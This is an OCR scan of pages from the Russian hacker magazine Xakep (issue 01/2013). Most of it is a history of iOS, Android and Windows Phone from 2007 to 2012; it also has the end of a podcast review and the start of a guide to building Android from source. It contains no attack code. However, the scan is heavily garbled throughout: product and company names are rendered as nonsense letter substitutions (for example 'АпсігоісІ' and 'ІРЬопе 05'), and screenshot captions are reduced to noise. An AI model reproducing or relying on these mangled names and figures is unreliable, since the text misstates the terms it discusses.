(и не только). Это крайне дина- 
мичный сегмент ІТ-безопасности, 
наблюдать за развитием событий в котором особенно интересно. 

В гостях у подкаста часто бывают именитые специалисты. 






ІЫРОРМІТ 

• несколько раз в неделю • английский 

Любопытный конгломерат аудио- 
и видео подкастов, суммарно 
охватывающий практически все 
сферы ІТ. Удобно разделен на от- 
дельные каналы, среди которых: 
вопросы сертификации, сетевая 
безопасность и информационная 
безопасность в целом, подкасты 
для Мае- и ѴѴіпсІоѵѵз-девелоперов, 
отдельный Ореп Боигсе подкаст и многое другое. Обновляется все это 
часто и регулярно. 



50СІАІ-ЕЫ6ІМЕЕР РОйСАБТ 

50сіа1-епдіпеег.огд/робса5І 

• ежемесячно • английский 

Подкаст сайта «социальный 
инженер», как ты понимаешь, 
не совсем обычен. Однако нет, 
здесь далеко не всегда говорят 
непосредственно о социаль- 
ной инженерии (хотя и часто). 
Некоторые выпуски полностью 
посвящены известным личностям, 
крупным конференциям, знаковым событиям в мире ІТ и так далее. 
Создатели данного ресурса и подкаста призывают познавать ИБ 
через обучение и создают для этого все условия. 





5ЕС0ВАВІТ 

зесигаЬіІ.сот 

• 2-3 раза в месяц# английский 

Еще один подкаст, главной темой 
которого является информаци- 
онная безопасность во всех ее 
проявлениях. На сайте реализо- 
вана очень удобная система на- 
вигации — можно выбрать любой 
интересующий тебя топик (будь 
то ботнеты, социальная инже- 
нерия, уязвимости или реверс 
малвари) и получить список всех выпусков, где обсуждались и под- 
нимались данные вопросы. 



ВСЕМ Е 

зсепе.грогі.ги 

• раз в несколько месяцев • русский 

Теплый ламповый подкаст 
с говорящим названием. Всем 
любителям демосцены — крайне 
рекомендуется. Отличные под- 
борки трекерной музыки, новости 
одемопати, история мировой 
и российской сцены, обзоры ста- 
рых и уже культовых мероприятий. 
Словом, всем, кого мучает ностальгия, и всем, кому небезразлична 
демосцена, — смотреть и слушать! Жаль, что обновления довольно 
нерегулярны. 





ХАКЕР 01 /168/2013 



041 








Х-МОВИЕ 



Евгений Зобнин (апсігоісіаігееі.гиі 




БОЛЬШАЯ 

тройка! 



НАГЛЯДНАЯ 
ИСТОРИЯ 
РАЗВИТИЯ 
ТРЕХ ГЛАВНЫХ 
ОС МОБИЛЬНОГО 
РЫНКА 



За последние годы мобильный рынок из- 
менился настолько сильно, что сегодня 
даже топовый смартфон пятилетней дав- 
ности выглядит нелепо и смешно. Развитие 
мобильных ОС двигалось семимильными 
шагами, и от господствовавших когда-то 
БутЬіап и ѴѴіпсіоѵѵз МоЬіІе не осталось ни- 
чего, кроме воспоминаний. В том, что про- 
изошло за последние пять лет и почему 
изменения оказались столь глобальными, 
мы попытаемся разобраться в этой статье. 



042 



ХАКЕР 01 /168/2013 




Большая тройка 




5ат$ипд баіаху Иехиз под управлением АпсігоісІ 4.0 



2007: ІРНОМЕ 0$ 1.0 И ПЕРВЫЙ 
АНОНС АЫОРОЮ 



2007 год стал одним из самых важных 
в истории развития карманных компьютеров 
и смартфонов. Именно в этом году, 9 января, 
на выставке Масѵѵогісі Сопіегепсе & Ехро был 
представлен іРЬопе, перевернувший все пред- 
ставления пользователей о смартфонах. После 
презентации «телефона Стива Джобса» все 
остальные смартфоны мгновенно стали уста- 
ревшими, причем настолько, что, будь іРЬопе 
выпущен на год позже, ситуация нисколько бы 
не изменилась. 

Именно іРЬопе задал тот стиль взаимодей- 
ствия со смартфоном, к которому мы привыкли 
сегодня. Никаких клавиш управления, ника- 
кого стилуса и мелких элементов на экране, 
никакого джойстика, место которых заменили 
большой четкий экран, по-настоящему умная 
операционная система, рабочий стол, по- 
добный Мае 05 X, полноценный веб-браузер 
и концепция «нескольких касаний» для до- 
ступа к любой функции девайса. Выпущенный 
на рынок в июне, ІРЬопе стал абсолютным хи- 
том продаж на несколько лет вперед и принес 
яблочной компании миллиардные прибыли. 

Интересно, что в техническом плане іРЬопе 
вовсе не был прорывом. Практически все на- 
ходки, приписываемые Стиву Джобсу и Арріе, 
существовали и ранее, но, как это всегда бы- 
вало с Арріе, они первые догадались собрать 
все лучшее вместе и реализовать это на таком 
высоком уровне. Во многом это удалось благо- 
даря использованию полноценной ОС, которая 
фактически была форком настольной Мае 05 X 
и, как следствие, обладала широчайшими воз- 
можностями для создания приложений. Они 
могли задействовать в своей работе любые 
функции телефона, в том числе 30-ускоритель, 
благодаря которому интерфейс ІРЬопе 05 
работал на удивление плавно и быстро. 



Первая версия ІРЬопе 05 не обладала 
какой-то особенной функциональностью, 
но предлагала пользователям достаточно 
полный стек приложений для повседневной 
работы, включая умную адресную книгу, 
браузер, проигрыватель мультимедиафайлов, 
планировщик, почтовый клиент, будильник 
и другие. Для всего остального же, как это 
ни странно, Стив Джобс предлагал использо- 
вать веб-приложения, которые уже в то время 
прекрасно работали в мобильной версии 
Заіагі. Поддержка же сторонних приложений 
не была предусмотрена как таковая и появи- 



лась только во второй версии операционной 
системы, которая была выпущена ровно через 
год после начала продаж первого ІРЬопе. 

2007-й стал также годом анонса АпсігоісІ, 
который явно произошел под давлением 
стремительно набирающего популярность 
продукта от Арріе. Тогда АпсігоісІ фигурировал 
только в виде бета-версии комплекта для раз- 
работчиков (50К), оснащенного эмулятором, 
в котором можно было вживую «покрутить» ОС. 

12 ноября 5йК был выложен в Сеть, и любой 
пользователь или разработчик мог составить 
свое личное впечатление от ОС и решить 



МОБИЛЬНАЯ 



пятилетка 



з Выпуск ІРЬопе 

з Первый анонс 
АпсігоісІ 

Г° Создание альянса 
производителей 
мобильной 
техники ОНА 



Выпуск іРЬопе 36 

Анонс магазина 
мобильных 
приложений Арріе 
Арр 5іоге 

Выпуск первого 
смартфона на базе 
АпсігоісІ 1.0 НТС 
Огеат 



Выпуск 
іРЬопе 365 

Обновление 
АпсігоісІ до версии 
2.1 



Г° Начало 

стремительного 
распространения 
АпсігоісІ 
на мобильном 
рынке 



| ° АНОНС \Д/ІПСІ0ѴѴ5 

РЬопе 7 и первых 
устройств 
на ее основе 

Выпуск іРЬопе 4 
с Реііпа-дисплеем 

Г° Обновление 
АпсігоісІ 
до версии 2.3 



Обновление 
АпсігоісІ до версии 
4.0 

Выпуск планшета 
Моіогоіа Хоот 
под управлением 
первой 
планшетной 
версии АпсігоісІ 

Выпуск іРЬопе 
4 б и І05 5.0 
с голосовым 
помощником 5ігі 



Г° Обновление 
Мпсіоѵѵб РЬопе 
до версии 7.5 



120071 



Выпуск линейки 
ОС семейства 
Мпсіоѵѵб 8 для 
ПК, планшетов 
и смартфонов 

Обновление 
АпсігоісІ до версии 
4.2, оснащенной 
инновационным 
мобильным 

ПОМОЩНИКОМ 

боодіе ЬІоѵѵ 

Г° Выпуск іРЬопе 5 
с удлиненным 
экраном 
и ОС І05 6.0 



120121 



ХАКЕР 111/168/2013 



043 




Х-МОВИЕ 




Первый іРас! 




Тор ІЧе\л/5 
5роіТ$ 

Ѵапсоиѵег 20Т 

5ИоѵѵЬІ2 

Ы.5. Ые\л/5 

ѴѴогІсІ 

ѴѴаску 

ТесНпоІоду 

Ви5ІПѲ55 



Интерактивная «журнальная страница» — одна из ключевых метафор интерфейса Меіго 



для себя, стоит ли она его внимания. И впечат- 
ления большинства людей оказались очень 
неоднозначными. Сразу бросалось в глаза 
подозрительное сходство с ІРЬопе 05; АпсігоісІ 
выглядел какой-то нелепой копией операци- 
онной системы для ІРЬопе, намного менее эф- 
фектной, но фактически повторявшей ее. Во- 
вторых, боодіе пошла по немного странному, 
но логичному пути, оснастив ОС виртуальной 
машиной Оаіѵік, исполняющей свой собствен- 
ный формат байт-кода, который генерировался 
из байт-кода .Іаѵа-приложений. 

Однако главной чертой ОС стала ее явная 
недоработанность, вызванная погоней за стре- 
мительно набирающей популярность ІРЬопе 
05. В первом АпсігоісІ'е не было даже таких 
простых вещей, как наэкранная клавиатура, 
поддержка ВІиеІооіЬ и Орепбі., виртуальная 
машина исполняла байт-код без задейство- 
вания ЛТ-компиляции, а общее впечатление 
создавалось такое, что в ОС нет какой-то 
центральной линии, но есть множество ин- 
тересных идей, небрежно наложенных друг 
на друга стопкой. Такое ощущение, к слову, 
будет сохраняться еще долго, вплоть до выпу- 
ска четвертой версии ОС. 

Как бы там ни было, в результате Ооодіе 
все-таки смогла переманить независимых раз- 
работчиков на свою сторону, устроив конкурс 
на создание уникальных приложений с очень 
заманчивыми призами в виде множества 
долларовых купюр. Этот финт дал большой 
выигрыш при запуске продаж первого Апсігоісі- 
смартфона в следующем году. 



2008: ІРНОЫЕ ОБ 2.0 И АШКОЮ 1.0 



2008 год ознаменовался сразу двумя важными 
событиями, одним из которых стал выпуск 
нового іРЬопе 30, работающего под управ- 
лением іРЬопе 05 2.0. Сам по себе смартфон 
не представлял особого интереса и являлся 
не чем иным, как слегка доработанной версией 
первого іРЬопе, в котором появилась поддерж- 
ка 36 и А-6Р5. Но вот операционная система 



іРЬопе 05 2.0 вновь стала своеобразным про- 
рывом, принеся владельцам старого и нового 
варианта смартфона долгожданную поддержку 
нативных приложений. 

Причины, по которым это событие стало на- 
столько важным, просты. Будучи полноценной 
ОС, работающей на стандартном современном 
железе и поддерживающей все его возможно- 
сти, іРЬопе 05 дала разработчикам возмож- 
ность создавать приложения без оглядки 
на совместимость, размеры экрана, ограни- 
чения устройства или среды исполнения Раѵа 
МЕ, например). Это привело к появлению боль- 
шого количества мобильных приложений со- 
вершенно нового класса, которые задействуют 
в своей работе датчики положения, компас, 
6Р5-модуль и преимущества большого экрана. 
Кроме того, іРЬопе 05, по сути, положила на- 
чало появлению действительно качественных 
мобильных игр, которые могли похвастаться 
хорошей ЗР-графикой (задействуется встроен- 
ный 30-ускоритель с полноценной поддержкой 
ОрепбЦ а также многопальцевым сенсорным 
управлением и управлением с помощью датчи- 
ка положения. 

Свою роль также сыграла правильно вы- 
бранная политика распространения приложе- 
ний только через официальный магазин Арр 
5іоге: каждое загруженное в него творение 
проверялось сотрудниками Арріе на каче- 
ство и отсутствие вредоносного поведения. 
Можно было купить и установить любой софт 
за несколько тапов по экрану, используя 
официальный клиент Арр 51оге, узнать рей- 
тинги приложений и посмотреть скриншоты 
перед покупкой. Не являясь изобретателем 
онлайн-магазина приложений как такового, 
Арріе фактически стала пропагандистом этой 
идеи, полностью запретив пользователям 
устанавливать софт из других источников и, 
по сути, форсировав изменение в мышлении 
пользователей. 

Стоит отметить при этом, что, несмотря 
на законченность іРЬопе 05 как серьезной 



операционной системы, в то время в ней 
фактически не было многозадачности. С целью 
сохранить плавность работы и «отзывчи- 
вость» ОС, программисты Арріе оставили 
возможность работы в фоне только стоковым 
приложениям, предустановленным в ОС, тогда 
как сторонний софт убивался сразу после 
переключения на другую задачу. И хоть такой 
подход и отдавал 005'ятиной, он принес свои 
плоды на первых этапах существования ОС, 
когда производительность ІРЬопе была сильно 
ограниченной. 

Второе важное и, наверное, еще более 
значимое событие 2008 года — это фактиче- 
ски первое рождение операционной системы 
АпсігоісІ, состоявшееся 23 сентября вместе 
с выпуском АпсігоісІ 5йК 1.0, который вклю- 
чал в себя уже почти готовую, но все так же 
отдающую недоработанностью операционную 
систему. 

Первый серийный смартфон на этой 
ОС появился уже через месяц и был разрабо- 
тан компанией НТС специально для боодіе. 

Имя он получил двойное: НТС Огеат или 
же Т-МоЫІе 61. Только с выпуском этого 
девайса стала очевидна настоящая изюмин- 
ка АпсігоісГа как операционной системы, 
превращающей смартфон в некий терминал 
для доступа к сервисам боодіе. Дело в том, 
что АпсігоісІ не только включал в себя мно- 
жество клиентских приложений к сервисам 
поисковика (поиск, почта, календарь, карты, 
чат и ѴоиТиЬе), но и позволял слинковать 
пользователя со всеми этими сервисами еди- 
ножды, введя свои логин и пароль от почты. 
После этого на смартфон начинали сыпаться 
сообщения, пришедшие по электронной почте 
и в чате, уведомления из календаря, а все 
контакты автоматически синхронизировались 
с боодіе. Тот же логин и пароль использова- 
лись для доступа к магазину приложений, 
который уже включал в себя множество со- 
фтин, разработанных в течение года с момента 
выпуска бета-версии АпсігоісІ 5йК. 



ХАКЕР 01 /168/2013 








Большая тройка 




2009-й можно по праву считать годом расцвета 
Апсігоісі'а как мобильной ОС. Производители 
мобильной техники начали присматриваться 
к АпсігоісГу и анонсировать свои первые устрой- 
ства на его основе, боодіе продолжала спешно 
дорабатывать ОС, залатывая множественные 
пробелы в ее дизайне и функциональности. 

9 февраля поисковый гигант выпускает 
первое обновление операционной системы 
под индексом 1.1, которое не принесло особых 
новшеств и было выпущено для закрытия 
найденных багов и проблем в АРІ. В конце 
апреля компания выложила уже полноценное 
обновление Апсігоісі 1.5, получившее офици- 
альное имя Сирсаке. Эта версия включала 
в себя множество важных изменений, таких 
как наэкранная клавиатура, виджеты рабочего 
стола, возможность съемки видео, поддержка 
ВІиеІооіЬ-гарнитур, автоматическое перевора- 
чивание экрана, а также множество других. 

Спустя полгода, 15 сентября, Зоодіе анон- 
сировала Апсігоісі 1.6 бопііі, которая включала 
в себя множество доработок, движок синтеза 
речи, а также, что очень важно, поддержку бо- 
лее высоких, чем 320 на 480, разрешений экра- 
на и интегрированную функцию подгонки при- 
ложений к разным разрешениям. Последняя 
позволила без каких-либо проблем запускать 
приложения на разных устройствах даже в том 
случае, если разработчик не предусмотрел 
поддержку разных разрешений экранов (грубо 
говоря, картинка просто масштабировалась). 

Всего через месяц боодіе выпускает 
Апсігоісі 2.0 Есіаіг, которую можно назвать по- 
следней на этапе перехода к действительно 
стабильной и полнофункциональной опе- 
рационной системе. Есіаіг включает в себя 
множество доработок, таких как поддержка 
множества боодіе-аккаунтов, ВІиеІооІЬ 2.1, 
новую наэкранную клавиатуру, переработан- 
ный интерфейс, а также множество улучшений 
в стоковых приложениях, например 5МБ, бра- 
узер и камера, которая наконец-то получила 
поддержку различных эффектов, цифровой 
зум и макрофокус. 

Год 2009-й — это также год выпуска первых 
моделей смартфонов под управлением новой 
ОС. Лидером на этом рынке становится тай- 
ваньская НТС, выпустившая сразу три новые 
модели смартфонов: НТС Мадіс, более продви- 
нутый НТС Него и бюджетный НТС ТаКоо. Поз- 
же в игру вступает китайский Ниаѵѵеі с бюд- 
жетным смартфоном РиІ5е и Батзипд с первым 
девайсом легендарной линейки баіаху, 
а также бюджетной «спицей» (Бріса). Однако 
настоящий фурор производит внезапно вы- 
шедшая из тени компания Моіогоіа со своим — 
ставшим впоследствии культовым — топовым 
смартфоном Моіогоіа бгоісі, оснащенным 
потрясающим по тем временам 3,7-дюймовым 
экраном с разрешением 480 * 854 пикселей, 
высокопроизводительным процессором 
ОМАР3430, 512 Мб оперативной памяти и рабо- 
тающим под управлением свежайшей Апсігоісі 
2.0. Именно благодаря Апсігоісі у Моіогоіа смог- 



ла ворваться на, казалось бы, уже упущенный 
рынок смартфонов и впоследствии крепко 
удерживать свои позиции. 

Что касается ІРЬопе 05, то здесь Арріе 
придерживается прежнего курса посте- 
пенных ежегодных модернизаций. 17 июля 
Стив Джобс представляет публике ІРЬопе 
365, оснащенный улучшенным дисплеем, 
более производительным процессором 
Батзипд 55РС100, работающим на частоте 
600 МГц (вместо штатных 833), графическим 
Зб-ускорителем РоѵѵегѴР 56X535, вдвое 
увеличенным объемом оперативной памяти 
(256 Мб взамен 128 Мб), цифровым компасом 
и видеокамерой на 3 Мп (вместо 2 Мп в ІРЬопе 
36). Как и положено, третья версия смартфо- 
на работает под управлением ІРЬопе 05 3.0, 
включающей в себя более ста нововведений, 
среди которых функция копирования и встав- 
ки, поддержка ММ5, поиск по всему смарт- 
фону БроІІідМ, а также функции удаленного 
вайпа и поиска смартфона. 



одновременно сочетал в себе все основные 
графические составляющие современного 
большого города, такие как информационные 
табло, путеводители и глянцевые журналы, 
что делало его интуитивно понятным и про- 
стым в использовании. 

Интересно, что, несмотря на совершенно 
новый интерфейс и АРІ программирования, 
который делал все написанные для ѴѴіпсІоѵѵз 
МоЬіІе приложения несовместимыми с новой 
ОС, внутри \Л/іпсіоѵѵ5 РЬопе продолжала оста- 
ваться все той же ѴѴіпсІоѵѵз СЕ с устаревшим 
ядром, основанным на технологиях ѴѴіпсІоѵѵз 
95. Для разработки же приложений и игр 
МісгозоК предложила использовать специ- 
альную версию БіІѵегІідМ и фреймворк ХМА, 
также используемый в мультимедиаплеере 
2ипе и приставке ХЬох 360. Тем не менее, 
как и в случае с І05, многозадачность опера- 
ционной системы была урезана, так что про- 
граммист не мог рассчитывать на фоновое 
исполнение приложения, но мог использовать 



2010: ѴШ00ѴѴ5 РНОЫЕ 7, АЫОРОЮ 
2. 2-2.3, 105 4.0 



2010 год был, наверное, самым насыщенным 
в истории мобильной техники. Одним из наи- 
более значимых событий стал анонс опера- 
ционной системы ѴѴіпсІоѵѵз РЬопе 7, работа 
над которой началась в 2008 году. ОС была 
представлена 15 февраля на выставке МоЬіІе 
ѴѴогІсІ Сопдгезз и сразу привлекла к себе 
всеобщее внимание благодаря совершенно 
новому, необычному и невероятно эффектному 
интерфейсу Меіго. 

Меіго выглядел стильно, минимали- 
стично и при этом выводил опыт общения 
с ОС и приложениями на совершенно иной 
уровень, а если точнее — возвращал поль- 
зователя к привычным моделям взаимодей- 
ствия с окружающей средой, к которым мы 
привыкли в обыденной жизни. Интерфейс 



ІТТШ 



• Начиная с четвертой 
версии, іРЬопе 05 начала 
носить имя ЮЗ, и компании 
Арріе пришлосьлицен- 
зировать новое название 

у Сізсо, которая владела 
правами на торговую марку 
105 — ОС, работающей 
в маршрутизаторах. 

• Еще в 2007 году НТС соз- 
дала для боодіе опытный 
образец смартфона боодіе 
Боопег с полноценной 
0\ѴЕРТѴ-клавиатурой под 
экраном, однако смартфон 
так и не был выпущен 

на рынок. 

• Вместе с Апсігоісі боодіе 
создала альянс произ- 
водителей мобильной 
техники ОНА (Ореп Напсізеі 
АІІіапсе), в который сегодня 
входит около пятидесяти 
компаний, среди них НТС, 
Моіогоіа, Іпіеі, 1.6, ЫѴШІА, 
Батзипд и многие другие. 



АРІ для выполнения некоторых типов фоновых 
задач, таких как получение почты или обнов- 
ление данных из Сети. 

11 октября исполнительный директор 
МісгозоЙ Стив Баллмер анонсировал десять 



Так выглядел 
один из первых 
прототипов 
смартфона на 
Апсігоісі 




ХАКЕР 01 /168/2013 




Х-МОВИЕ 



устройств под управлением \Л/іпсІоѵѵ5 РЬопе 
7 от таких производителей, как НТС, беІІ, 
Затзипд и (_б. Устройства сразу же были вы- 
пущены на рынок. 

2010-й также стал годом очередного 
технологического триумфа компании Арріе, 
которая представила миру сразу три значимых 
продукта: новый, действительно модернизи- 
рованный іРЬопе 4, планшет іРасі и операци- 
онную систему Ю5 4.0, в которой наконец-то 
появилась многозадачность. 

Центральное событие во всей этой цепоч- 
ке, конечно же, связано с іРасі — планшетным 
компьютером, о котором Стив Джобс говорил 
еще в далеком 1983 году, предрекая выпуск 
«мощного компьютера с размерами книги, 
на обучение использованию которого потре- 
буется не больше двадцати минут». С техни- 
ческой точки зрения революции не произо- 
шло и в этот раз. По сути, это был всего лишь 
большой іРЬопе с экраном 9,7 дюйма, процес- 
сором на 1 ГГц и особой модификацией ІРЬопе 
05 3.2, которая почти не отличалась от версии 
для смартфона и позволяла использовать все 
те же приложения. Однако благодаря каче- 
ству исполнения Арріе вновь удалось открыть 
совершенно новый рынок. 

іРасі был представлен в апреле, но уже 
в июне, следуя своей традиции, Арріе анон- 
сировала ІРЬопе 4, главными особенностями 
которого стали экран разрешением 960 * 640 
пикселей, вдвое увеличенный объем опера- 
тивной памяти (512 Мб) и фронтальная камера 
для видеозвонков на 0,3 Мп. Вместе с новым 
іРЬопе была представлена І05 4.0, которая 
стала первой ОС, несовместимой с некоторыми 
предыдущими версиями смартфона и доступ- 
ной для нового типа девайса — іРасі. 

Главной изюминкой І05 4.0 стала более 
полная, но при этом неполноценная много- 
задачность. Отныне сторонние приложения 



могли работать в фоне, однако их возмож- 
ности были ограничены набором «фоновых 
АРІ», примерно так же, как это реализовано 
в ѴѴіпсіоѵѵз РЬопе. Приложения могли про- 
игрывать музыку, определять местополо- 
жение устройства, выводить уведомления, 
запрашивать дополнительное время для вы- 
полнения незаконченной задачи, но не могли 
«просто работать» в фоне, как это происходит 
в настольных операционных системах или 
ОС Апсігоісі. 

Для экосистемы АпсІгоісІ’а 2010 год оказал- 
ся не менее значимым. Именно этот год стал 
настоящим бумом выпуска Апсігоісі-устройств 
практически всеми сколько-нибудь значимы- 
ми игроками мобильного рынка. К ОС начали 
серьезно присматриваться разработчики, так 
что к середине года в Апсігоісі Магкеі можно 
было найти уже 100 тысяч приложений, а концу 
года их количество выросло до 400 тысяч. 

В этом же году произошло два серьезных об- 
новления ОС, благодаря которым Апсігоісі уже 
можно было назвать законченной ОС. 

В мае была представлена версия Апсігоісі 
2.2 Ргоуо, главной особенностью которой ста- 
ло улучшение производительности благодаря 
включению ЛТ-компиляции в виртуальной 
машине Эаіѵік, интеграции .15-движка Ѵ8 
в стандартный браузер, а также множествен- 
ные оптимизации кода. В этой же версии 
появилась долгожданная возможность разда- 
вать интернет с помощью ѴѴі-Рі (ѴѴі-Рі Ьоізроі), 
а также новый домашний экран, в котором 
наконец-то появился док, на манер І05. Через 
полгода увидела свет версия Апсігоісі 2.3 
біпдегЬгеасі, в которой можно было отметить 
первые шаги боодіе по модернизации интер- 
фейса и приведению его к более приемлемому 
виду, а также такие функции, как 5ІР ѴоІР, 
улучшения в энергопотреблении и поддержку 
чипов МРС. 





Излишнее 
внимание 
к деталям 
не всегда 
уместно — 
как бы говорят 
дизайнеры Арріе 
своим корейским 
коллегам 




Ыехиз 7 — первая по-настоящему удачная попытка 
боодіе выйти на планшетный рынок 



2011: ДИВНОЮ 3.0-4. 0, 
ѴѴІЫ00ѴѴ5 РНОЫЕ 7.5 И 105 5.0 



2011-й стал первым годом в истории «гонки 
вооружений», который не преподнес каких- 
то сюрпризов в области мобильных ОС. Арріе 
спокойно и невозмутимо продолжает выпу- 
скать новые версии смартфонов, планшетов 
и планомерно обновлять І05. Місгозоіі заклю- 
чает контракт с ІЧокіа и выпускает минорное 
обновление ѴѴіпсіоѵѵз РЬопе 7.5 Мапдо. боодіе 
выпускает Апсігоісі 3.0 НопеусотЬ — действи- 
тельно мажорное обновление ОС, которое тем 
не менее не создает резонанса из-за ориенти- 
рованности только на планшеты и закрытого 
исходного кода, серьезно ограничившего 
распространение ОС. 

Апсігоісі 3.0 была представлена 22 февраля 
вместе с планшетом Моіогоіа Хоот и являла 
собой скорее не законченную ОС, а попытку 
боодіе вторгнуться на рынок планшетов, за- 
ново открытый Арріе. Третья версия ОС не по- 
лучила широкого распространения, однако 
сработала на отлично в качестве демонстра- 
ции того, какими будут следующие версии 
АпсІгоісІ’а. Операционная система была серьез- 
но переработана, в том числе в плане интер- 
фейса пользователя, который наконец получил 
свой собственный запоминающийся и неве- 
роятно эффектный минималистичный стиль, 
названный Ноіо (от ЬоІодгарЬіс — голографи- 
ческий). Интерфейс не только стал приятным 
для глаза, но и получил так давно ожидаемую 
плавность работы благодаря задействованию 
графического процессора. Многие другие под- 
системы ОС также были переработаны, а общие 
требования к железу серьезно повысились. 

В этом же году боодіе выпустила еще два 
серьезных обновления ОС, включая версии 3.1 



ХАКЕР 01 /168/2013 








Большая тройка 



^ 51аП 


;Т у л * (по = 


ф РгісЯау 

24 ОсіоЬег 2008 


11:09 АМ 

* 


ф СеПіпд Біагіегі 


$ Тар Ьеге Іо зеі оѵѵпег іпГогтаЬоп 


О N° ипгеасі теззадез 


| N0 Іазкз 


Ф N0 ирсоттд аррот(теп (5 


шЕ' Оеѵісе ипіоскесі 








Саіепсіаг 


Сопіасіз 



\Л/іпгіоѵѵ5 МоЬіІе — на смартфонах тоже был «Пусю 



БТагТ 




* 1геѵог@дтаіІ. 


сот 


07 * 


а 


ѴоиСат 

«О 




^ 5 * 

(МмСмк 

иѵ-г 


Я _ 


о ^ 






ФФ| 21 


шшт 




гт ^ р| ау<пд 

ж Ш * гг-- 


□ е 




Ыж » V М«рі И 


ц В 


Чоігг ІЬг 

СЛЛг жЛ Мж 1 ІтПв 


■ 


е «5 * 


іУ 

» * 


коЬо 


•г. 



Рабочий стол Жіпсіоѵѵз 8 в стиле Меіго 



и 3.2, в которых была проведена дальнейшая 
работа по унификации интерфейса, оптимиза- 
ции производительности, появилась под- 
держка различных ІІБВ-устройств. Однако их 
исходный код также был закрыт, а работа над 
«телефонными версиями» системы фактиче- 
ски завершена до конца года, когда был пред- 
ставлен Апсігоісі 4.0 Ісе Сгеат БапсіѵѵісЬ. 

Четвертая версия Апсігоісі'а стала идейным 
продолжением НопеусотЬ, но ориентированным 
как на планшеты, так и на смартфоны. Ісе Сгеат 
БапсіѵѵісЬ включала в себя полностью перерабо- 
танный стек приложений, переписанный с нуля 
домашний экран, реализованный по всем прави- 
лам нового 1)1 Ноіо, новый шрифт РоЬоІо, отлично 
подходящий для отображения текста на экра- 
нах с высокой плотностью пикселей, функцию 
разблокировки по снимку лица (которую легко 
обмануть, показав телефону фотографию вла- 
дельца], функцию ѴѴі-Рі Бігесідля прямой пере- 
дачи файлов между устройствами, а также давно 
ожидаемую поддержку ѴРЫ. 

Именно Ісе Сгеат БапсіѵѵісЬ сделал Апсігоісі 
не просто «альтернативой іРЬопе для бедных», 
а реальным конкурентом на рынке мобильных 
ОС. Апсігоісі 4.0 была функциональна, удобна, 
красива, легка в использовании и обладала 
функциями, которых не было у ее конкурента. 

В феврале была представлена новая 
версия ѴѴіпсіоѵѵз РЬопе 7.5 под кодовым именем 
Мапдо, в которую был интегрирован Іпіегпеі 
Ехріогег 9, обладающий всеми возможностями 
настольной версии, расширена поддержка 
многозадачности для фоновых приложений 
и появилась возможность синхронизации 
с ѴѴіпсіоѵѵз І_іѵе БкуОгіѵе. Практически в то же 
время Стив Баллмер объявил о заключении со- 
глашения с компанией ЬІокіа, по которому по- 
следняя будет отдавать предпочтение ѴѴіпсіоѵѵз 
РЬопе при выборе мобильной ОС. Фактически 
это означало, что Мокіа начинает выпуск 
смартфонов только на ѴѴіпсіоѵѵз со всеми вы- 



текающими отсюда последствиями, в виде 
стагнации и вылета из пятерки крупнейших 
производителей смартфонов благодаря не- 
любви пользователей к «слишком необычной» 
и непопулярной ѴѴіпсіоѵѵз РЬопе. 

В октябре АррІе представляет іОБ 5.0, в ко- 
торой появляется функциональность, впервые 
предложенная разработчиками Апсігоісі а, 
а именно ІМоІіЬсаІіоп Сепіег, то есть область 
уведомлений, доступная по выдвижению ста- 
тусной строки вниз. Также новая версия ОС по- 
лучает интеграцию с іСІоисІ, облачным серви- 
сом АррІе, функционально схожим с йгорЬох, 
и сервис іМеззаде, позволяющий пересылать 
5М5, используя интернет-соединение. 



2012: АШКОЮ 4.0-4.2, 
ѴѴІМР0ѴѴ5 РНОЫЕ 8 И 105 6.0 



Самым значимым событием 2012 года стал, 
конечно же, выпуск ѴѴіпсіоѵѵз 8, с которым 
МісгоэоК неожиданно для многих вновь со- 
вершила серьезный рывок вперед. Несмотря 
на то что технически операционных систем было 
представлено три, все они теперь основаны 
на одной кодовой базе ѴѴіпсіоѵѵз N1 и базируются 
на интерфейсе Меіго (который в настольной 
версии можно отключить]. АРІ между системами 
также теперь совместим, что делает перенос 
приложений фактически решенной задачей, 
а пользователи планшетов, по сути, будут 
работать с настоящей настольной версией си- 
стемы. Это было очень красноречиво показано 
на примере представленного тогда же планшета 
Мпсіоѵѵз Биг^асе с отключаемой клавиатурой. 

Фактически ѴѴіпсіоѵѵз 8 — это универсаль- 
ная ОС для любых типов устройств с одним 
репозиторием приложений, одним интерфей- 
сом, системой организации меню и настроек. 
Операционная система, в которой пользова- 
тель будет работать с одним софтом, неза- 
висимо от девайса, и не потеряется в новом 
интерфейсе. Это именно то, к чему пытались 



прийти АррІе и Ооодіе, но первой пришла, 
как ни странно, МісгогоН. 

К слову сказать, программисты Ооодіе так- 
же не сидели на месте и успели выпустить два 
инкрементальных обновления ОС. В Апсігоісі 4.1 
ЭеІІу Веап поработали над увеличением про- 
изводительности, появились интерактивные 
уведомления, умный рабочий стол, который 
научился выстраивать элементы на экране 
в ответ на перетаскивание ярлыка или вид- 
жета. Появился также помощник боодіе ЬІоѵѵ, 
который подсказывал различные данные, ос- 
новываясь на том, что пользователь искал не- 
давно в боодіе, его местоположении и актив- 
ности в боодіе-»-. Версия Апсігоісі 4.2 ЭеІІу Веап 
(да, именно так) принесла возможность делать 
сферические фотографии (аналогичные боодіе 
Бігееі Ѵіеѵѵ), в ней появились давно ожидае- 
мые кнопки управления питанием в панели 
уведомлений, единый интерфейс для планше- 
тов и смартфонов, а также интеграция БЕЫпих. 

АррІе, в свою очередь, представила вместе 
с іРЬопе 5 новую версию ІОБ с индексом 6.0, 
которая, по сути, не получила серьезных изме- 
нений, кроме множества доработок во встро- 
енных приложениях, интеграции с РасеЬоок и 
удаления из состава предустановленных при- 
ложений ѴоиТиЬе и боодіе Марз (что сыграло 
с АррІе злую шутку, так как новые векторные 
карты АррІе оказались никуда не годными]. 



ВЫВОД 



Пять лет — небольшой срок, однако мир 
мобильной техники за этот период успел кар- 
динально измениться. Кажется невероятным, 
что когда-то мы пользовались смартфонами, 
которые не умели выполнять автоматическую 
синхронизацию с боодіе, обладали кучей 
кнопок и не имели централизованного источ- 
ника приложений. Теперь все это в прошлом, 
и трудно себе представить, как изменится мир 
за следующие пять лет. :х 



ХАКЕР 01 /168/2013 



047 






Х-МОВИЕ 



Роман Гоций (доІ5І]готапйдтаіІ.сот) 




ОБЩИЕ 
ПРИНЦИПЫ 
СБОРКИ АЫОКОШ 
ИЗ ИСХОДНЫХ 
КОДОВ 



Пересборка АпбгоісІ из исходных кодов требуется для многих за- 
дач. Это может быть потребность в недостающих модулях ядра 
Ыпих, компиляция с более агрессивными опциями оптимизации, 
создание и отладка собственных модулей, а также различные ка- 
